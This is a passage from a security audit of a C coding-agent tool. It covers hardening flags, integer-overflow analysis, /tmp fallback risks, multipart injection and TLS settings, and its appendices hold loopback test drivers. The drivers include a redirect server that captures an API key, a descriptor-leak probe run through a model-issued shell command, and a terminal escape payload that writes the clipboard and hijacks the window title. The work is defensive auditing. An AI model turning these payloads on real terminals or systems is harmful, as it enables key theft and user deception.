reproducible rather than remembered; `docs/PLATFORMS.md` uses "Verified / Partly verified
/ Never compiled" strictly. Against that standard, **security mitigations are the one
axis measured nowhere.** jichi runs on five libcs and three non-Linux kernels, and on
each of them its hardening is whatever that toolchain happens to default to — untracked,
unstated, and different per row. The Debian rows inherit a hardened gcc. A musl or
bionic or hand-built-gcc row may inherit nothing, and today no artifact of this project
would say so.

**Recommended.** A `HARDEN=1` block, default on, probed like every other capability
(`-fstack-protector-strong` is not universal, so probe rather than assume), carrying:
`-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2` **with `-O1` as the default build's
floor**, `-Wl,-z,relro -Wl,-z,now`, `-Wl,-z,noexecstack`, `-fPIE -pie`, and where the
toolchain has them `-fstack-clash-protection` and `-fcf-protection`. Add a line to
`make info`, since that target exists precisely to show what was detected.

Then — and this is the part that matters more than the flags — **a smoke lint that greps
`readelf` output and fails when a mitigation is missing.** That converts "we set the
flags" into "this binary has them", makes each platform row report its own posture, and
is a direct application of `TEST_INTEGRITY.md`'s "prefer a lint to an audit". Without it
you have my word for today's binary, which is exactly the kind of evidence this project
has decided not to accept.

Two honest caveats. `SIZE=1` builds for the small targets will grow slightly; that is a
real trade-off on a 32 MB row and the numbers should be measured, not assumed, by the
existing tiers. And `-O1` as a floor changes the default build's debugging experience
somewhat, so `-Og` may be the better floor — worth measuring against the gate's runtime.

### M2 — The warning set is narrower than the discipline around it

**Confidence: reasoned.** **Severity: low, but unusually high value per unit of effort.**

A codebase that already holds zero warnings at `-Wall -Wextra -Werror` across 307 files
has earned the right to turn on more, and the marginal cost is near zero precisely
because the baseline is clean. Candidates, roughly in order of what they would find here:
`-Wformat=2` (format-string correctness, and this project formats constantly),
`-Wshadow`, `-Wpointer-arith`, `-Wwrite-strings`, `-Wcast-qual`, `-Wstrict-prototypes`,
`-Wmissing-prototypes`, `-Wold-style-definition` (all four especially valuable in C89,
where an omitted prototype is legal and silently disables argument checking),
`-Wundef`, `-Wredundant-decls`, `-Wjump-misses-init`, `-Wlogical-op`,
`-Wduplicated-cond`, `-Wvla`, `-Walloca`.

Land them **one flag per commit**, because zero-warnings is a hard invariant here and a
batch that trips three flags at once is a batch that gets reverted. `-Wvla` and
`-Walloca` should be free immediately and are worth adding first as tripwires: neither
construct is legal C89, so they can only ever fire on a mistake.

### M3 — Unchecked size arithmetic in the two primitives everything is built on

**Confidence: reasoned, and partly disconfirmed by testing — read the correction.**
**Severity: low today; the recommendation is about fragility, not a live hole.**

I went looking for integer-overflow memory corruption in the buffer primitives, found
two candidate shapes, and tested both. **Neither corrupts memory.** Recorded anyway,
because in both cases the reason they are safe is an accident rather than a guard, and
because the honest version of this section is more useful than the version where I was
right.

**`jc_sb_reserve` (`src/util/jc_str.c:41`).** Two unchecked computations:

```c
47:    need = b->len + extra + 1;          /* wraps if extra is near SIZE_MAX */
52:    while (newcap < need) { newcap *= 2; }   /* wraps to 0 -> infinite loop */
```

If `need` wraps small, the `need <= b->cap` early return succeeds and the caller's
`memcpy` writes the un-wrapped length — a heap overflow. If `need` exceeds `SIZE_MAX/2`,
the doubling loop wraps to 0 and spins forever. I could not find a caller that reaches
either: `jc_sb_append_n`'s lengths all derive from real buffer sizes. The two closest
were `jc_app.c:543` and `:755`, `byte_limit - out->len`, which wrap if `out` arrives
pre-filled past the limit — and the loop structure means it never does.

So: not live. But note what is holding it up — a whole-program argument about every
caller of a general-purpose primitive, which has to be re-made every time someone adds a
caller. On the 32-bit targets `SIZE_MAX/2` is 2 GB rather than 9 exabytes, which narrows
the margin considerably. Two `if`s in `jc_sb_reserve` replace that argument with a local
guarantee, and a general-purpose buffer primitive is the right place to pay for one.

**`jc_lsp_framer_pop` (`src/lsp/jc_lsp_proto.c:56–127`).** `find_content_length`
accumulates `v = v * 10 + digit` with no overflow check and no sanity cap, then
`total = hdr_len + 4 + clen` is unchecked, then `memcpy(body, …, clen)`. That is the
textbook shape. I built a harness against the real framer and fed it hostile headers:

```
sizeof(jc_size)=8
CL=7                          -> pop=1 body=non-null
CL=18446744073709551615       -> pop=0 body=null      (SIZE_MAX)
CL=18446744073709551614       -> pop=0 body=null
CL=99999999999999999999999999 -> pop=0 body=null      (wraps)
CL=4000000000                 -> pop=0 body=null
```

Nothing corrupts. Two accidents are why. `SIZE_MAX` is caught because
`find_content_length` returns `(jc_size)-1` for "malformed" — the hostile value collides
with the error sentinel. Everything near `SIZE_MAX` is caught because `malloc(clen + 1)`
fails first and the code checks it. Neither is a bounds check; both are coincidences that
a refactor can remove — swap in an arena or a pool that does not fail, or change the
sentinel to something distinguishable, and the `memcpy` goes live.

**The live defect here is the missing cap, which is a different bug.** `clen` has no
upper bound, so `Content-Length: 4000000000` makes jichi buffer without limit waiting for
a body that never arrives — `pop` returns 0 each time and `f->buf` grows on every feed.
A hostile or broken language server memory-DoSes the agent, and on the low-memory rows
that is an OOM kill. Fix: a `JC_LSP_MAX_BODY` cap checked before `malloc`, resync on
violation — the same shape `JC_SSE_FIELD_MAX` already applies to the SSE path, which is
the precedent to copy.

**The lesson for a junior**, which is the real reason this section exists: I reasoned my
way to two memory-corruption bugs and the reasoning was wrong both times. What made the
difference was thirty lines of harness linking the actual function. **Test the hostile
input; do not derive it.** And when the test says "safe", find out *why* — "safe because
malloc happens to fail" and "safe because we checked" are the same result today and
different results after the next refactor.

### M4 — `jc_home_dir()` silently relocates every private sink to `/tmp`

**Confidence: reasoned.** **Severity: medium in the deployment shape the docs recommend.**

```c
49: const char *jc_home_dir(void)
    {
        const char *h = getenv("HOME");
        if (h == NULL || h[0] == '\0') {
            return "/tmp";
        }
        return h;
    }
```

49 call sites depend on this, including the config path (`jc_config.c:87`, `:930`),
sessions (`jc_session.c:36`, `:41`), and by extension `~/.jichi.env` — the API key file —
plus telemetry and audit.

With `HOME` unset, all of that moves to `/tmp`, which is world-writable and sticky. The
sticky bit stops another user *deleting* your files; it does not stop them **creating
files or symlinks at paths you have not used yet**. So another local user can pre-create
`/tmp/.jichi.env`, or make `/tmp/.jichi.d` a symlink into a directory they own. And this
is precisely the case M132's `0600`/`0700` cannot address: `jc_make_private` applies a
mode to whatever the path resolves to, so against a pre-planted symlink it hardens the
attacker's file.

`HOME` is unset more often than it seems: some container images, some cron
configurations, some systemd units, and anything invoked from a daemon that cleaned its
environment. That is the same list as the unattended deployments `AUTONOMOUS_LOOPS.md`
recommends — and the failure is silent, which is the worst property it could have. A
loop that has been writing its audit trail to a shared `/tmp` for a month looks exactly
like one that has not.

**Recommended: fail loudly instead of relocating.** An unset `HOME` is a broken
environment, and jichi's whole state model is `~`-rooted; a clear error naming the
variable is more useful than a working run in the wrong place. If a fallback is wanted,
`getpwuid(getuid())->pw_dir` is the correct one — it asks the system where the user's
home is rather than guessing a world-writable directory. Add a `doctor` check either way.

**Related, smaller (`src/main.c:6299`).** `jichi recover` with no `--into` builds
`/tmp/jichi-recover-<12 chars of the ref>` — a predictable path in a world-writable
directory. It does check `jc_is_dir(into)` first, and `git worktree add` refuses a
non-empty target, so I could not turn it into anything; it is still a predictable `/tmp`
path, and `mkdtemp` costs one line.

### L1 — Weak randomness where two consumers deserve better

**Confidence: reasoned.** **Severity: low.**

`jc_uuid_v4` is `rand()` seeded from `time(NULL) ^ &local` (`src/util/jc_uuid.c`), and
`jc_uuid.h` says so honestly: "Not cryptographically strong". I checked all five
consumers and **none is an authentication token**, so this is not the vulnerability it
would be in a web application. Two still deserve a better source:

- **The multipart boundary** (`jc_multipart.c:13`). A boundary is a delimiter, and
  `jc_multipart_file` appends payload bytes *without checking they do not contain it*
  (`:50–52`). Predictable delimiter plus unchecked payload is the shape of a multipart
  injection; the payload here is a model-chosen file, e.g. a transcription upload.
- **Session ids**, because they name files.

Fix: read 16 bytes from `/dev/urandom` when available and keep `rand()` as the documented
fallback for platforms without it. Also: `srand()` in a library mutates process-global
state — worth a comment at minimum.

### L2 — Multipart header injection via an unescaped filename

**Confidence: reasoned.** **Severity: low.**

```c
42:    jc_sb_append(&mp->body, "\"; filename=\"");
43:    jc_sb_append(&mp->body, filename != NULL ? filename : "file");
```

No escaping of `"`, CR or LF. Reached from `jc_transcribe.c:75` with a model-chosen path,
so a filename containing CRLF injects arbitrary headers — or an entire extra part — into
the request body. Fix: reject or strip CR, LF and `"` in `filename` and `name`.

### L3 — The path fence is check-then-open

**Confidence: reasoned.** **Severity: low.**

`jc_path_in_root` resolves with `realpath()` and returns a verdict; the `open()` happens
later. Between the two, the path can change — a **TOCTOU** (time-of-check to time-of-use)
window. Ordinarily academic, but jichi runs background commands and parallel children
concurrently with tool calls, so there is a second actor by design. `O_NOFOLLOW` on the
final component, or an `fstat` re-check after opening, closes it. Note again that
`jc_path_under_root` itself is correct — this is about *when* the check happens, not
whether it is right.

### L4 — No TLS floor, and nothing warns about a plaintext provider

**Confidence: measured (both absences).** **Severity: low alone; it amplifies H1 and H2.**

```
$ grep -rn 'CURLOPT_SSLVERSION\|CURLOPT_SSL_VERIFY' src/
(nothing)
```

No minimum TLS version is set, so the floor is whatever libcurl defaults to on that
system — and the platform matrix includes deliberately old libcurl. Peer and host
verification are also never set explicitly; libcurl's defaults are correct (on, and
strict), so this is not a live hole, but H1 is a demonstration of what happens when this
project relies on a libcurl default it does not state.

Separately: **nothing warns when `apiBase` is plaintext `http://`.** I ran the whole
audit against `http://127.0.0.1` configs and jichi never mentioned it; `doctor`'s posture
checks cover key presence, not transport. Plaintext turns H1 into a passive
key-interception, and turns H2's inherited socket from ciphertext into the conversation.

Fix: set `CURL_SSLVERSION_TLSv1_2` as the minimum, set `SSL_VERIFYPEER`/`VERIFYHOST`
explicitly so the intent is in the source rather than in libcurl's changelog, and add a
`doctor` WARN for a non-loopback `http://` apiBase.

---

## 4. What I checked and found sound

A negative result is a result, and a report that lists only problems misleads about where
the code stands. Each of these I looked at specifically, expecting to find something:

| Checked | Verdict |
|---|---|
| `jc_path_under_root` prefix boundary | **Correct** — checks for `/` or end-of-string; the classic `/work-evil` bypass does not work |
| `jc_base64_decode` write bounds | **Correct** at every write, including both trailing partial-group cases |
| `system()` in real code | **Absent** — all four hits are template strings in `src/scaffold/` |
| `popen` usage | One wrapped call site, for a documented SIGPIPE reason |
| `gets`, `vsprintf`, `alloca`, VLAs, `tmpnam`, `mktemp`, `strtok` | **None** |
| Temp file creation | `mkstemp` + `rename`, mode-before-write; no `tmpnam`/`mktemp` anywhere |
| AF_UNIX socket ACLs | `0600` + `0700` parent, explicit `umask` for the daemon socket (M322) |
| Secret redaction plumbing | Registry in `jc_log.c`, wired into the log, eventlog and audit adders |
| SSE memory bound | `JC_SSE_FIELD_MAX` correct for what it was built for (see H4 for what it is not) |
| Signal handlers | Set flags only, `volatile`; `signal()` is async-signal-safe. One nit: `volatile int` rather than `volatile sig_atomic_t` (`jc_app.h:296`) — technically the wrong type, benign in practice, and CLAUDE.md already states the stricter rule |
| `jc_utf8_sanitize` UTF-8 validation | **Correct** — rejects overlongs, surrogates, >U+10FFFF, truncated sequences. It is a correct UTF-8 validator; it is not a control-character filter, and H3 is about the gap between those two jobs, not a defect in this function |
| Environment scrubbing for children (M130) | Works as designed; H2 is a different channel, not a failure of this one |
| Provider TLS verification | Correct by libcurl default (see L4 for why "by default" is the note) |

---

## 5. Where I could be wrong

- **H1's old-libcurl amplification is unverified.** I could not check offline which
  libcurl version introduced the cross-host `Authorization` strip, so I did not name one.
  If your real floor is newer than that fix, the finding is narrower than I have written
  it — Anthropic-shaped providers only. It is still the primary provider.
- **H2's provider-socket impact depends on the deployment.** I demonstrated the
  descriptor is present and read-write. Over TLS I did *not* demonstrate key extraction
  and do not believe it is possible. If someone reads that finding as "the model's shell
  can steal the key over HTTPS", that is more than I showed.
- **H3's severity depends on the terminal.** OSC 52 is widely supported but not
  universal, and tmux gates it behind `set-clipboard`. The passthrough is certain; what a
  given terminal does with it is not.
- **H4's crash thresholds are from this machine.** The depths will differ with compiler,
  optimization level and frame layout. The shape — a few KB of input on a small-stack
  target — will not.
- **§3's severities are the least reliable content in this document.** They are review
  comments. M3 is the worked example of why: I reasoned to two conclusions and testing
  overturned both.
- **`docs/DEFERRED.md` records a shell/interpreter sandbox as the project's oldest
  safety deferral, with the honest position that a userspace heuristic cannot contain a
  determined program and the real answer is deployment.** I agree, and none of the
  findings above contradicts it. But note that H2 is *not* an instance of that deferral:
  closing descriptors is not containment of a hostile program, it is not handing one your
  keys on the way in. It is cheap, it is local, and it is worth doing whether or not a
  sandbox ever lands.

---

## 6. Recommended sequence

Ordered by *(damage prevented) ÷ (lines changed)*, which is not the same as ordered by
severity. Every item is small; the largest is M1.

**First — one line each, no design work.**

1. **H1**: make `CURLOPT_FOLLOWLOCATION` conditional. One line. Closes an API-key
   exfiltration path.
2. **H4**: the depth counter, plus the corpus entry. Six lines. Closes a remote crash on
   five input paths.
3. **M4**: fail on unset `HOME` instead of returning `/tmp`. A few lines, and it removes a
   silent-misconfiguration class from the deployment the docs recommend.

**Second — small and mechanical.**

4. **H2**: `FD_CLOEXEC` at every `open`/`socket`, the close-range loop in all eight child
   paths, and `CURLOPT_SOCKOPTFUNCTION` for libcurl's sockets.
5. **H3**: apply M363's existing strip rule at the output chokepoint.
6. **L4**: TLS floor, explicit verification options, `doctor` WARN on plaintext `apiBase`.

**Third — the build, which is the largest item and the one with the longest tail.**

7. **M1**: the `HARDEN=1` block, `-O1` (or `-Og`) as the default floor, a `make info`
   line, and the `readelf` lint. Then re-run the platform tiers so `PLATFORMS.md` can
   state each row's posture — which is the deliverable, more than the flags are.

**Fourth — hygiene, at leisure.**

8. **M3** (the two `if`s in `jc_sb_reserve`, the `JC_LSP_MAX_BODY` cap), **M2**
   (one warning flag per commit), **L1**, **L2**, **L3**.

**And regardless of the order: land each fix with its lint.** Appendices A–C are three of
the four drivers, already written and working. This document is an audit, and by this
project's own standard — recorded in `TEST_INTEGRITY.md` after its suites had failed while
green — an audit is the weakest form of assurance it accepts. The audit found what it knew
to look for. The lints are what keep it found.

I would also add a row to `docs/DEFERRED.md` for anything here you decide *not* to do.
That register exists so a deferral is findable rather than remembered, and "we looked at
descriptor inheritance and decided the deployment boundary covers it" is exactly the kind
of decision that should be written down rather than rediscovered.

---

## 7. The five lessons, for a reader who is learning this

Extracted deliberately, because the findings are specific to jichi and these are not.

**1. A fence has four channels, not two.** When you restrict a child process, ask about
its environment, its filesystem permissions, its **inherited descriptors**, and its
arguments. H2 exists because two were covered thoroughly and one was invisible. The
invisible one is almost always descriptors, because nothing in normal operation shows
them to you — you have to go and look at `/proc/self/fd`.

**2. Every recursive parser needs a depth limit, and it needs it before it ships.** If
the input controls how deep you recurse, the input controls your stack. The fix is six
lines and there is never a good reason to be without it. And note *how* H4 stayed hidden:
a coverage-guided fuzzer cannot find it, because depth generates no new coverage. A green
fuzzer bounds the inputs it can reach, which is a narrower claim than it sounds like.

**3. A credential attached to a request must not survive a change of destination.** H1 is
one of the oldest bugs in HTTP clients and it keeps recurring, because the redirect
machinery is invisible and helpful. If your library protects you, find out *which*
version does and whether that is the version you ship — and prefer not needing the
protection: an API endpoint has no business redirecting, so do not follow.

**4. A terminal is an interpreter, so untrusted output is untrusted input.** Bytes you
print to a terminal can move the cursor, erase what you already showed, set the title,
and write the user's clipboard. "It is only being displayed" is not a safety argument.
jichi had already reasoned this out correctly for pasted input and written the decision
down; the gap was that output is the same problem wearing different clothes.

**5. Test the hostile input; do not derive it.** §3's M3 is the honest centrepiece of this
report. I reasoned my way to two memory-corruption bugs in code that turned out to have
neither, and thirty lines of harness told me so in a minute. Reasoning about integer
overflow is *hard* — the arithmetic is modular, the guards interact, and the outcome
depends on whether `malloc` fails. Then, when the test says safe, ask **why** it is safe:
"because we checked" survives the next refactor, and "because `malloc` happened to fail
first" and "because the hostile value collided with our error sentinel" do not.

---

## Appendix A — smoke driver: the key must not survive a redirect (H1)

Two loopback servers: A redirects, B records. The assertion is on what B received, which
is what an attacker would receive. Save as `tests/smoke/provider_redirect_key.sh`; it
needs a small helper server, so either port the two servers into `tests/tools/` C89 (the
tier's convention — `mockmodel` already does most of this) or keep it in `tests/e2e/`
where python3 is permitted. Written here in the form I ran it.

```python
# redirect_probe.py -- server A 302s to server B; B prints the headers it got.
import socket, threading, sys
A, B = 18201, 18202

def read_req(conn):
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = conn.recv(65536)
        if not d:
            return None, b""
        buf += d
    head, rest = buf.split(b"\r\n\r\n", 1)
    cl = 0
    for l in head.split(b"\r\n"):
        if l.lower().startswith(b"content-length:"):
            cl = int(l.split(b":")[1])
    while len(rest) < cl:
        d = conn.recv(65536)
        if not d:
            break
        rest += d
    return head, rest

def srvA(conn):
    if read_req(conn)[0] is None:
        return
    conn.sendall(b"HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:%d/v1/chat/completions"
                 b"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % B)
    conn.close()

def srvB(conn):
    head, _ = read_req(conn)
    if head is None:
        return
    print("=== redirect target received ===", flush=True)
    for l in head.decode(errors="replace").split("\r\n"):
        print("   ", l, flush=True)
    body = b'data: {"choices":[{"delta":{"content":"hi"}}]}\n\ndata: [DONE]\n\n'
    conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: "
                 + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
    conn.close()

def listen(port, fn):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", port)); s.listen(5)
    while True:
        c, _ = s.accept()
        threading.Thread(target=fn, args=(c,), daemon=True).start()

threading.Thread(target=listen, args=(A, srvA), daemon=True).start()
threading.Thread(target=listen, args=(B, srvB), daemon=True).start()
sys.stderr.write("ready\n"); sys.stderr.flush()
import time
while True:
    time.sleep(1)
```

Config, and the assertion (repeat per provider — `anthropic` is the one that fails today):

```json
{"models":[{"name":"m","provider":"anthropic","model":"claude-x",
"apiBase":"http://127.0.0.1:18201/v1","apiKey":"SUPER-SECRET-KEY-abc123","roles":["chat"]}],
"snapshots":false,"repoMap":false,"references":false,"lowResource":false,"maxRetries":0}
```

```sh
jichi --config redir.json --no-session -p hello < /dev/null
# PASS if the recorded headers do NOT contain SUPER-SECRET-KEY-abc123
```

## Appendix B — smoke driver: a model-issued shell sees only fds 0,1,2 (H2)

A `mockmodel` script and a total assertion. This one fits the POSIX-sh smoke tier
directly, since `mockmodel` already does everything needed. Linux-only
(`/proc/self/fd`) — skip loudly elsewhere.

```sh
#!/bin/sh
# smoke: a model-issued shell inherits NO descriptor beyond stdio (H2).
. "$(dirname "$0")/_smoke.sh"
[ -d /proc/self/fd ] || t_skip "needs /proc/self/fd (Linux)"
t_plan 1
smoke_home
tmp=$(smoke_tmp); ws=$(smoke_tmp)

cat > "$tmp/replies.mm" <<'MM'
wire openai
rule
  count 1
  tool run_terminal_command {"command":"ls /proc/self/fd | paste -sd, -"}
rule
  text DONE
MM

mm_start "$tmp/replies.mm" "$tmp/cap" 6
cat > "$tmp/config.json" <<EOC
{"models":[{"name":"m","provider":"openai","model":"mock",
"apiBase":"http://127.0.0.1:$MM_PORT/v1","apiKey":"x","roles":["chat"]}],
"snapshots":false,"repoMap":false,"references":false,
"toolProfile":"full","lowResource":false,"maxRetries":0}
EOC

out=$(cd "$ws" && with_deadline 90 "$BIN" --config "$tmp/config.json" \
      --no-session --auto --journal "$tmp/run.jsonl" --log "$tmp/tel.jsonl" \
      -p probe < /dev/null 2>&1)
mm_stop
# The `ls` itself holds one extra descriptor, so 0,1,2 plus exactly one more.
echo "$out" | grep -q '^0,1,2,3$' \
  && t_ok 1 "no descriptors leaked to the model's shell" \
  || t_fail "leaked descriptors: $(echo "$out" | grep -o '^[0-9,]*$')"
```

Run against the tree as it stands, this reports the leak: `0,1,2,3,4,5,6,7,8`.

## Appendix C — smoke driver: no ESC byte survives to output (H3)

The mock returns one assistant message carrying real control bytes; the assertion is that
none reach stdout. Build the payload programmatically — a literal ESC in a shell script is
itself a hazard, and several editors and pagers will mangle it.

```python
# esc_probe.py -- one assistant message carrying real terminal control sequences.
ESC = chr(27); BEL = chr(7)
payload = ("BEGIN"
           + ESC + "]0;WINDOW-TITLE-HIJACKED" + BEL   # OSC 0  : set window title
           + ESC + "]52;c;cHduZWQ=" + BEL             # OSC 52 : write the clipboard
           + ESC + "[31mRED" + ESC + "[0m"            # SGR    : colour
           + ESC + "[2KEND")                          # CSI 2K : erase the line
```

Serve that as the `content` of a `chat/completions` SSE delta (same server skeleton as
Appendix A), then:

```sh
jichi --config esc.json --no-session -p hello < /dev/null > out.bin 2>&1
python3 -c "
d = open('out.bin','rb').read()
assert b'\x1b]52;' not in d, 'OSC 52 clipboard write reached the terminal'
assert b'\x1b]0;'  not in d, 'OSC 0 title set reached the terminal'
print('ESC bytes in output:', d.count(b'\x1b'))
"
```

Against the tree as it stands: `ESC bytes in output: 5`, and both assertions fail.

A second driver should cover the **tool-output** path — a fixture file containing OSC 52,
read via `read_file` — because that is a different code path to the same terminal, and one
test covers one of them.
